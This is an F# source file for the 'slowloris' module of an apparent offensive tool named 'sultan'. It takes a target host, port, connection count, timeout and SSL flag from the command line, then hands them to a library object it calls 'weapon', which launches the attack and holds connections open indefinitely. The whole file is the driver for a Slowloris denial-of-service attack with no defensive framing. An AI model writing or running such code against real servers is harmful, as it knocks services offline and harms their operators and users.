namespace sultan

open sultan
open sultan.printxlib

open socklib

open System
open System.IO
open System.Text
open System.Numerics
open System.Threading
open System.Net.Sockets
open System.Collections.Generic

open CommandLine
open CommandLine.Text

module slowloris =
    type options = {
        [<Option('d', "host", Required = true)>] host : string;
        [<Option('p', "port", Required = false, Default = "80")>] port : string;
        [<Option('c', "connections", Required = false, Default = "30")>] connections : string;
        [<Option('t', "timeout", Required = false)>] timeout : string;
        [<Option('s', "ssl", Required = false)>] ssl : string;
    }

    let attack (args : string[]) =
        let mutable param = Parser.Default.ParseArguments<options>(args)
        let mutable opt : options = Unchecked.defaultof<options>

        match param with
            | :? Parsed<options> as parsed ->
                opt <- parsed.Value
            | :? NotParsed<options> as notParsed ->
                errorfn ("100 invalid options. " + (**notParsed.Errors.[0] +**) "fatal.")
                exit 1

        let host = opt.host

        let port = opt.port
        let connections = opt.connections
        let time = opt.timeout
        let ssl = opt.ssl

        let mutable usessl : bool = false
        let mutable timeout : int = 120000

        try
            usessl <- System.Boolean.Parse(ssl)
            ()
        with
            | :? ArgumentException as err ->
                warn "101 useSSL parameter is null, defaulting to FALSE"
                ()
            | :? IndexOutOfRangeException as err ->
                warn "101 useSSL parameter is null, defaulting to FALSE"
                ()
            | :? FormatException as err ->
                warn "102 useSSL parameter was not in the correct format, defaulting to FALSE"
                ()
        try
            timeout <- System.Int32.Parse(time)
            ()
        with
            | :? ArgumentException as err ->
                warn "103 timeout parameter is null, defaulting to 120000 ms"
                ()
            | :? IndexOutOfRangeException as err ->
                warn "103 timeout parameter is null, defaulting to 120000 ms"
                ()
            | :? FormatException as err ->
                warn "104 timeout parameter is not a valid number, defaulting to 120000 ms"
                ()
        let weapon = new sllib(timeout)
        weapon.attack(host, System.Int32.Parse(port), usessl, System.Int32.Parse(connections));
        Thread.Sleep(Timeout.Infinite);
        0
